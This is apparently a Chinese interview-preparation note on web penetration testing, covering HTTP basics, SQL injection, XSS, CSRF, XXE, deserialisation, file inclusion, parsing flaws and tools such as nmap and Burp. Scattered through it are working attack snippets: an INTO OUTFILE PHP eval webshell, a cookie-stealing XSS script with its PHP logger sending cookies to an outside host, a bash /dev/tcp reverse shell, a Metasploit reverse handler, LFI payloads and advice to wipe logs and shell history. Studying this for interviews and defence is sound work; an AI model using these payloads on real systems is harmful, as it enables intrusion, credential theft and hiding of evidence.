## 面试
### 1、计算机基础
#### ✸	当你在浏览器输入一个网址按回车之后发生了什么
1.DNS解析<br>
DNS根据域名查询IP地址的过程为：<br>
浏览器缓存 --> 操作系统缓存 --> 路由器缓存-->本地（ISP）域名服务器缓存 --> 根域名服务器。<br>
2.进行TCP连接<br>
浏览器终于得到了IP以后，向服务器发送TCP连接，TCP连接经过三次握手。<br>
3.浏览器发送HTTP请求<br>
4.服务器处理请求<br>
服务器收到浏览器的请求以后，会解析这个请求（读请求头），然后生成一个响应头和具体响应内容。<br>
5.浏览器解析渲染页面<br>
6.关闭TCP连接<br>
当数据完成请求到返回的过程之后，根据Connection的Keep-Alive属性可以选择是否断开TCP连接，经过4次挥手TCP断开。<br>
#### ✸	windows查看进程命令？杀进程命令？查看端口？
查端口={windows:netsat -ano;<br>
Linux:netstat -antlp}<br>
进程 = {windows:tasklist,taskkill;<br>
Linux:ps aux,kill -9 pid}<br>
#### ✸	区分windows和Linux的方法？
(1)网址中修改大小写，不能正常访问就是linux，否则windows；<br>
(2)ping www.baidu.com，看TTL值来判断：linux~64/windows~128<br>
(3)nmap -O ip，<br>

### 2、HTTP协议
#### ✸	HTTP有哪些方法，get和post方法区别有哪些
get/post/request，<br>
(1) get是从服务器上获取数据，post是向服务器传送数据；<br>
(2) get传送的数据量较小，不能大于2KB。post传送的数据量较大，一般被默认为不受限制<br>
(3) get安全性非常低，post安全性较高。<br>
GET请求只能进行url编码，而POST支持多种编码方式。<br>
#### ✸	HTTP状态码
https://www.runoob.com/http/http-status-codes.html<br>
分类	分类描述<br>
1**	信息，服务器收到请求，需要请求者继续执行操作<br>
2**	成功，操作被成功接收并处理<br>
3**	重定向，需要进一步的操作以完成请求<br>
4**	客户端错误，请求包含语法错误或无法完成请求<br>
5**	服务器错误，服务器在处理请求的过程中发生了错误<br>
各类别常见状态码：<br>
2xx （3种）<br>
200 OK：表示从客户端发送给服务器的请求被正常处理并返回；<br>
204 No Content：表示客户端发送给服务端的请求得到了成功处理，但在返回的响应报文中不含实体的主体部分（没有资源可以返回）；<br>
206 Patial Content：表示客户端进行了范围请求，并且服务器成功执行了这部分的GET请求，响应报文中包含由Content-Range指定范围的实体内容。<br>
3xx （5种）<br>
301 Moved Permanently：永久性重定向，表示请求的资源被分配了新的URL，之后应使用更改的URL；<br>
302 Found：临时性重定向，表示请求的资源被分配了新的URL，希望本次访问使用新的URL；<br>
       301与302的区别：前者是永久移动，后者是临时移动（之后可能还会更改URL）<br>
303 See Other：表示请求的资源被分配了新的URL，应使用GET方法定向获取请求的资源；<br>
      302与303的区别：后者明确表示客户端应当采用GET方式获取资源<br>
304 Not Modified：表示客户端发送附带条件（是指采用GET方法的请求报文中包含if-Match、If-Modified-Since、If-None-Match、If-Range、If-Unmodified-Since中任一首部）的请求时，服务器端允许访问资源，但是请求为满足条件的情况下返回改状态码；<br>
307 Temporary Redirect：临时重定向，与303有着相同的含义，307会遵照浏览器标准不会从POST变成GET；（不同浏览器可能会出现不同的情况）；<br>
4xx （4种）<br>
400 Bad Request：表示请求报文中存在语法错误；<br>
401 Unauthorized：未经许可，需要通过HTTP认证；<br>
403 Forbidden：服务器拒绝该次访问（访问权限出现问题）<br>
404 Not Found：表示服务器上无法找到请求的资源，除此之外，也可以在服务器拒绝请求但不想给拒绝原因时使用；<br>
5xx （2种）<br>
500 Inter Server Error：表示服务器在执行请求时发生了错误，也有可能是web应用存在的bug或某些临时的错误时；<br>
503 Server Unavailable：表示服务器暂时处于超负载或正在进行停机维护，无法处理请求<br>

### 3、安全
#### ✸	OOB-dns外带注入
	目标机DBMS生成出站TCP/UDP/ICMP请求，出口防火墙亦允许该出站请求；然后直接或间接引发了DNS解析过程，那么攻击者就可能从DNS中窃取数据。这就是DNS外带数据。<br>
#### ✸	SQL注入原理，产生条件，如何修复
原理：用户输入的内容传到web应用，没有经过过滤或者严格的过滤，被带入到了数据库中进行执行<br>
条件：用户能够控制自己的输入，没有严格过滤<br>
危害：<br>
（1）数据库信息泄露<br>
（2）网页篡改<br>
（3）恶意数据操作，删表，插入数据等<br>
修复：<br>
（1）用户输入验证<br>
（2）关键字转义<br>
（3）加密敏感数据<br>
（4）数据库权限控制：根据程序要求为特定的表设置特定的权限，如程序只需要select权限则只赋予select查询权限；<br>
（5）目录权限限制：WEB目录应至少遵循“可写目录不可执行，可执行目录不可写”的原则。<br>
#### ✸	SQL注入里面的时间盲注，具体用到哪些函数？
length()/ sleep()/ ascii()/ substr() benchmark()<br>
#### ✸	sql 注入写文件都有哪些函数？ 
(1)select '一句话' into outfile '路径' <br>
(2)select '一句话' into dumpfile '路径' <br>
(3) select '<?php eval($_POST[1]) ?>' into dumpfile 'd:\wwwroot\ baidu.com\ nvhack.php'<br>

#### ✸	时间盲注所用到的函数？
sleep(),ascii(),substr(),length()，benchmark()(讲出这个函数能加分)<br>

#### ✸	宽字节产生原理及解决办法？
宽字节注入是在GBK编码格式的数据库中，针对敏感符号前添加斜杠这种过滤方式，利用两个字节构成一个汉字的原理，我们在敏感符号前加%81-%FE之间的URL编码，与斜杠/（%5C）共同组成一个汉字，从而吃掉斜杠/，保证payload中的其他部分正常运行的一种注入方式。<br>
防御（两条合起来使用）（1）使用mysql_set_charset(GBK)指定字符集<br>
（2）使用mysql_real_escape_string进行转义<br>
#### ✸	mysql 的网站注入，5.0 以上和 5.0 以下有什么区别？ 
5.0 以下没有 information_schema 这个系统表，无法列表名等，只能暴力跑表名；5.0 以下是多用户单操作，5.0 以上是多用户多操做。 <br>
#### ✸	站库分离怎么判断？
mssql判断是否站库分离：<br>
获取客户端主机名：select host_name();<br>
获取服务端主机名：select @@servername<br>

#### ✸	发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？
（1）有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell<br>
（2）使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高<br>
（3）通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell<br>

#### ✸	判断出网站的CMS对渗透有什么意义？
查找网上已曝光的程序漏洞。<br>
如果开源，还能下载相对应的源码进行代码审计。<br>
#### ✸	一个成熟并且相对安全的CMS，渗透时扫目录的意义？
敏感文件、二级目录扫描<br>
站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点 <br>

#### ✸	注入写入webshell需要绝对路径，一般怎么去找绝对路径？
（1）错误的url get参数，可能返回网站路径<br>
（2）搜索引擎获取：语法搜索页面报错内容，可能获取到网站路径<br>
Site:test.com warning<br>
Site:test.com "fatal error"<br>
（3）文件读取漏洞，读取配置文件获得<br>
（4）phpinfo信息中的DOCUMENT_ROOT参数获取<br>
（5）phpmyadmin爆路径：/phpmyadmin/themes/darkblue_orange/layout.inc.php<br>

#### ✸	简要说明XSS漏洞分类及其危害
分类：反射性、存储型、DOM型<br>
危害：<br>
（1）窃取用户cookie，键盘记录<br>
（2）XSS配合其他漏洞getshell<br>
（3）刷流量，执行弹窗广告，强制发送电子邮件<br>
（4）传播蠕虫病毒<br>
防御：
（1）基于特征的的防御（关键字匹配，特征匹配）：对所有提交信息进行规则匹配检查；<br>
（2）基于代码修改的防御。<br>

#### ✸	xss 如何盗取 cookie ？ 
攻击者代码： <br>
```php
<?php $cookie=$_GET['cookie']; 
$time=date('Y-m-d g:i:s'); 
$referer=getenv('HTTP_REFERER'); 
$cookietxt=fopen('cookie.txt','a'); 
fwrite($cookietxt,"time:".$time." cookie:".$cookie." referer:".$referer.""); 
//注意双引号，容易出错 
fclose($cookietxt); 
?> 
```
脚本端： <br>
```javascript
<script> 
document.write('<img 
src="http://ip/cookie.php?cookie='+document.cookie+'" width=0 
height=0 border=0 />'); 
</script> 
```
获取到 cookie 后，用 firebug 找到 cookie ，新建cookie加入 cookie ，用referer 来提交，无需输入帐号密码直接登录进去！ <br>

#### ✸	CSRF、SSRF和重放攻击有什么区别？
CSRF是跨站请求伪造攻击，由客户端发起<br>
SSRF是服务器端请求伪造，由服务器发起<br>
重放攻击是将截获的数据包进行重放，达到身份认证等目的<br>
#### ✸	XXE漏洞
原理：XXE漏洞也叫XML外部实体注入。由于没有禁止外部实体的加载,攻击者可以加载恶意外部文件，而应用程序解析输入的XML数据时,解析了攻击者伪造的外部实体导致产生XML漏洞。<br>
防御方式<br>
1.禁止使用外部实体,例如ibxml_disable_entry_loader(true)<br>
2.过滤用户提交的XML数据,防止出现非法内容<br>

#### ✸	CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？
（1）XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。<br>
修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。<br>
（2）CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。<br>
修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer<br>
（3）XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。<br>
修复方式：XML解析库在调用时严格禁止对外部实体的解析。<br>
#### ✸	csrf 如何不带referer访问
通过地址栏，手动输入；从书签里面选择；通过实现设定好的手势。上面说的这三种都是用户自己去操作，因此不算CSRF。<br>

跨协议间提交请求。常见的协议：ftp://,http://,https://,file://,javascript:,data:.最简单的情况就是我们在本地打开一个HTML页面，这个时候浏览器地址栏是file://开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。那么我们接下来可以利用data:协议来构造一个自动提交的CSRF攻击。当然这个协议是IE不支持的，我们可以换用javascript:<br>


#### ✸	同源策略，跨域请求（CSRF中讲）
同源就是两个站有相同的协议、域名、端口；<br>
JSONP 是一种非官方的跨域数据交互协议。<br>
CORS 是 HTTP 的一部分，它允许服务端来指定哪些主机可以从这个服务端加载资源。<br>
JSON和JSONP区别：<br>
（1）定义不同：JSON是一种基于文本的数据交换方式（不支持跨域），而JSONP是一种非官方跨域数据交互协议。<br>
（2）核心不同：json的核心是通过XmlHttpRequest获取非本页内容，而jsonp的核心则是动态添加<script>标签来调用服务器提供的js脚本。<br>

####  ✸ 文件包含漏洞可以用来做啥，以及需要主要注意的事项？ 
（1 ）配合文件上传漏洞GetShell ，可以执行任意脚本代码，网站源码文件以及配置文件泄露，远程包含 GetShel ， 控制整个网站甚至是服务器 <br>
（2 ）allow_url_fopen 和 allow_url_include 为 ON 的话，则包含的文件可以是第三方服务器中的文件，这样就形成了远程文件包含漏洞 <br>
（3 ）/etc/passwd • 需要 magic_quotes_gpc=off,PHP 小于 5.3.4 有效 <br>
（4 ）/etc/passwd././././././././././././.[......]/././././././././. <br>
（5 ）php 版本小于 5.2.8 可以成功，linux 需要文件名长于 4096 ，windows需要长于 256 <br>
index.php?page=php://filter/read/=convert.base64-encode/resource=index.php <br>

#### ✸	伪协议（文件包含中讲PHP伪协议，phar）
 <img src=https://github.com/n4ttt/Sec-Note/blob/main/Image/interview1.png><br>

#### ✸	反序列化（在命令执行中讲）
序列化是将对象转换为可存储或传输的形式（把对象变成可以传输的字符串），反序列化就是将序列化之后的流还原为对象。<br>
魔法函数致使反序列化过程变得可控：_construct();_destruct();_sleep();_weakup();_toString()<br>
PHP反序列化漏洞防御：严格过滤unserialize函数的参数，及unserialize后的变量内容。<br>

Java反序列化漏洞<br>
由于很多站点或者RMI仓库等接口处存在java的反序列化功能，攻击者可以通过构造特定的恶意对象序列化后的流，让目标反序列化，从而达到自己的恶意预期行为，包括命令执行，甚至getshell等等。<br>
例如Apache Commons Collections是一个Collections收集器框架，其中某个接口类InvokerTransformer可以通过调用java的反射机制来调用任意函数，实现任意代码执行。<br>

防御：在InvokerTransformer进行反序列化之前进行一个安全检查<br>
#### ✸	Apache-CommonsCollections 是众多Java 反序列化漏洞中重要的Gadget，请简单描述 CommonsCollections(3.1) 为什么能用来执行任意命令<br>
参考解答：<br>
CommonsCollections组件中存在一个可以进行反射调用的方法（InvokerTransform）它具备反射调用的能力且参数完全可控！，此方法在反序列化对象的时候没有进行任何校验，导致可以反序列化任意类（如 Runtime ），通过构造恶意代码，即可实现任意命令执行。<br>
#### ✸	Fastjson反序列化原理
fastjson的功能就是将json格式转换为类、字符串等供下一步代码的调用，或者将类、字符串等数据转换成json数据进行传输，有点类似序列化的操作。<br>

#### ✸	说说phar反序列化漏洞原理
phar文件会以序列化形式存储meta-data头，当file_exists和is_dir函数<br>
可控，可以配合phar://伪协议，不依赖unserialize直接进行反序列化操作。<br>

#### ✸	redis未授权访问
（1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非<br>
等相关安全策略，直接暴露在公网；<br>
（2）没有设置密码认证（一般为空），可以免密码远程登录redis服务；<br>
（3）利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的进而ssh服务登录。<br>

#### ✸	中间件解析漏洞产生的原因
原因：由于中间件本身缺陷，在对上传文件进行解析时会出现一些不可预料的错误从而导致被利用，进行文件上传绕过。<br>
（一）apache解析漏洞<br>
1.多后缀<br>
存在版本：apache1.x和apache2.x<br>
 
2.配置问题导致漏洞<br>
（1）apache的conf里有配置AddHandler php5-script.php，则只有文件名包含php，都能以php执行；<br>
（2）apache的conf里有配置AddType application/x-httpd-php.jpg，即使文件后缀是jpg，也能以php执行。<br>
 
3.htaccess文件解析<br>
 
（二）IIS6.0解析漏洞<br>
1.目录解析<br>
网站目录下创建.asp或者.asa的文件夹，上传任意文件都被作为asp文件解析。<br>
2.文件解析<br>
服务器默认不解析;后面内容，所以xxx.asp;.html文件作为asp文件解析。<br>
3.其他解析文件类型<br>
asa、cer、cdx都作为asp文件类型来解析<br>
（三）IIS7.0/IIS7.5/Nginx 1.x畸形解析漏洞（PHP CGI解析漏洞）<br>
利用条件：<br>
（1）fast-CGI运行模式<br>
（2）php.ini里cgi.fix_pathinfo=1（默认为1）<br>
（3）取消勾选php-cgi.exe程序的“Invoke handler only if request is mapped to”<br>
 
 
  默认 Fast-CGI 开启，直接在 url 中图片地址后面输入/1.php ，会把正常图片当成 php 解析<br>

#### ✸	说出至少三种业务逻辑漏洞，以及修复方式？
（1）密码找回漏洞中存在密码允许暴力破解、存在通用型找回凭证、可以跳过验证步骤、找回凭证可以拦包获取等方式来通过厂商提供的密码找回功能来得到密码<br>
（2）身份认证漏洞中最常见的是会话固定攻击和 Cookie 仿冒，只要得到 Session 或 Cookie 即可伪造用户身份<br>
（3）验证码漏洞中存在验证码允许暴力破解、验证码可以通过 Javascript 或者改包的方法来进行绕过<br>

#### ✸	目标站发现某txt 的下载地址为 
http://www.test.com/down/down.php?file=/upwdown/1.txt ，你有什么思路？ <br>
这就任意文件下载漏洞，在 file=后面尝试输入 index.php 下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。<br>
#### ✸	甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？<br>
直接在网站二级目录/abc/下扫描敏感文件及目录。<br>

#### ✸	如何利用 php 的远程命令执行函数进行反弹 nc? 
system,exec,shell_exec,paassthru,popen,proc_popen, <br>
反弹 shell 公网服务器执行 nc –lvv 8888 <br>
目标服务器上执行?cmd= bash -i >& /dev/tcp/10.0.0.1/8888 0>&1 <br>

#### ✸	代码执行，文件读取，命令执行的函数都有哪些？ 
(1)代码执行： <br>
eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function <br>
(2)文件读取 ：file_get_contents(),highlight_file(),fopen(),readfile(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等 <br>
(3)命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open() <br>

img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？ <br>
src 指定一个远程的脚本文件，获取 referer <br>
#### ✸	owasp 漏洞都有哪些？ 
(1)SQL 注入防护方法： <br>
(2)失效的身份认证和会话管理 <br>
(3)跨站脚本攻击 XSS <br>
(4)直接引用不安全的对象 <br>
(5)安全配置错误 <br>
(6)敏感信息泄露 <br>
(7)缺少功能级的访问控制 <br>
(8)跨站请求伪造 CSRF <br>
(9)使用含有已知漏洞的组件 <br>
(0)未验证的重定向和转发 <br>

#### ✸	指纹识别：
web容器：Apache,Nginx,IIS,Tomcat,Weblogic<br>
web应用：Wordpress，seacms，dedecms<br>
web服务器语言：PHP，Java，.NET，Nodejs<br>
web后端框架：ThinkPHP，Strust2，Spring Boot，Laravel(PHP)，CakePHP，Django，Ruby on Rails，Flask(Python)，Express(Node.js)<br>
web前端框架：Vue，angularjs，react，Highcharts<br>
web前端语言：Javascript，CSS，Jquery<br>
web运营商：移动，联通<br>
第三方内容：youtube<br>
CDN运营商：阿里云，电信<br>

#### ✸	给你一个网站你是如何来渗透测试的? 
在获取书面授权的前提下：<br>
(1)**信息收集**<br>
 - 1、google hack 和fofa进一步探测网站的信息，后台，敏感文件 <br>
 - 2、网站指纹识别（包括cms ，cdn ，服务器操作系统版本，数据库版本，web 中间件，证书等）<br>
 - 3、找真实IP ，进行IP 地址端口扫描，对响应的端口进行漏洞探测，比如 rsync, 心脏出血，mysql,ftp,ssh 弱口令等。 <br>
 - 4、查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的 cms 或者其他漏洞。<br>
 - 5、扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php 探针 <br>

(2)**漏洞扫描和手工挖掘**<br>
开始检测漏洞，如 XSS,XSRF,sql 注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含， 远程命令执行，弱口令，上传， 编辑器漏洞，暴力破解等 <br>

(3)**漏洞利用** <br>
利用以上的方式拿到 webshell ，或者其他权限 <br>

(4)**权限提升** <br>
提权服务器，比如 windows 下 mysql 的 udf 提权，serv-u 提权，windows低版本的漏洞，如 iis6,pr,巴西烤肉， linux 脏牛漏洞，linux 内核版本漏洞提权，linux 下的 mysql system 提权以及 oracle 低权限提权 <br>

(5)**清理痕迹**
日志清理，history历史清理，文件~/.bash_history <br>

(6)**总结报告及修复方案**<br>
### 46.	Metasploit 打开反向监听的命令<br>
use exploit/multi/handler<br>
set payload windows/meterpreter/reverse_tcp<br>

### 4、工具
#### ✸	用过wireshark吗？用burpsuite抓过包吗？
（1）Fiddler 是以代理web服务器的形式工作的,它使用代理地址:127.0.0.1, 端口:8888. 当开启Fiddler会自动设置代理， 退出的时候它会自动注销代理。<br>
（2）wireshark是捕获机器上的某一块网卡的网络包。<br>

流量分析---wireshark简单的过滤规则<br>
过滤ip:<br>
过滤源ip地址:ip.src==1.1.1.1;,目的ip地址:ip.dst==1.1.1.1;<br>
过滤端口:<br>
过滤80端口:tcp.port==80,源端口:tcp.srcport==80,目的端口:tcp.dstport==80<br>
协议过滤:<br>
直接输入协议名即可,如http协议http<br>
http模式过滤:<br>
过滤get/post包http.request.mothod=="GET/POST"<br>

Buipsuite插件<br>
Autorize —— 强大的越权自动化测试工具<br>
在插件中设置一个低权限账号的 cookie，使用高权限的账户浏览所有功能。插件会自动用低权限账号重放请求，<br>
Turbo Intruder —— 短时间发送大量请求，增强版的intruder<br>

#### ✸	AWVS为什么不能扫描一些逻辑漏洞？
网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞<br>
#### ✸	nmap 扫描的几种方式? 
Nmap功能的实现基于各种层面的协议。<br>
（1）主机发现 <br>
nmap -sP x.x.x.x/24 PING扫描，扫描内网在线主机，利用网络层ICMP协议<br>
（2）端口扫描<br>
nmap -sU x.x.x.x UDP扫描，扫描主机打开的UDP端口，利用传输层的协议<br>
nmap -sS x.x.x.x TCP SYN半开放扫描，好处是不需要进行三次握手，不会留下日志信息<br>
nmap -sT x.x.x.x TCP Connect扫描，执行三次握手<br>
（3）版本侦测 <br>
nmap -sV x.x.x.x 版本探测<br>
（4）OS侦测<br>
#### ✸	MYSQL 有哪些提权方法？ 
（1 ）UDF 提权 <br>
（2 ）VBS 启动项提权 <br>
（3 ）Linx MySQL BackDoor 提权 <br>
（4 ）MIX.DLL 提权 <br>

### 5、语言
#### ✸	java执行命令的函数？
(1)runtime. exec<br>
(2)processbuilder<br>
(3)processlmpl:该类不能直接调用，可通过反射来间接调用<br>
